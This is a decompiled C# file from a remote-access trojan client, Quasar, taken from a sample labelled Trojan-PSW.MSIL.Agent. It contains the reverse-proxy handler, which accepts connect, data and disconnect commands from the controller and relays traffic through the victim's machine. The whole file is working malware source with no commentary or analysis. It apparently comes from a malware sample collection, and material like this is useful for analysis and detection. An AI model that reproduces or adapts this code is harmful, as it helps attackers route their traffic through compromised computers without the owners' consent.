// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Messages.ReverseProxyHandler
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Networking;
using Quasar.Common.Messages;
using Quasar.Common.Messages.ReverseProxy;
using Quasar.Common.Networking;

namespace Quasar.Client.Messages
{
  public class ReverseProxyHandler : IMessageProcessor
  {
    private readonly QuasarClient _client;

    public ReverseProxyHandler(QuasarClient client) => this._client = client;

    public bool CanExecute(IMessage message)
    {
      switch (message)
      {
        case ReverseProxyConnect _:
        case ReverseProxyData _:
          return true;
        default:
          return message is ReverseProxyDisconnect;
      }
    }

    public bool CanExecuteFrom(ISender sender) => true;

    public void Execute(ISender sender, IMessage message)
    {
      switch (message)
      {
        case ReverseProxyConnect message1:
          this.Execute(sender, message1);
          break;
        case ReverseProxyData message2:
          this.Execute(sender, message2);
          break;
        case ReverseProxyDisconnect message3:
          this.Execute(sender, message3);
          break;
      }
    }

    private void Execute(ISender client, ReverseProxyConnect message) => this._client.ConnectReverseProxy(message);

    private void Execute(ISender client, ReverseProxyData message) => this._client.GetReverseProxyByConnectionId(message.ConnectionId)?.SendToTargetServer(message.Data);

    private void Execute(ISender client, ReverseProxyDisconnect message) => this._client.GetReverseProxyByConnectionId(message.ConnectionId)?.Disconnect();
  }
}
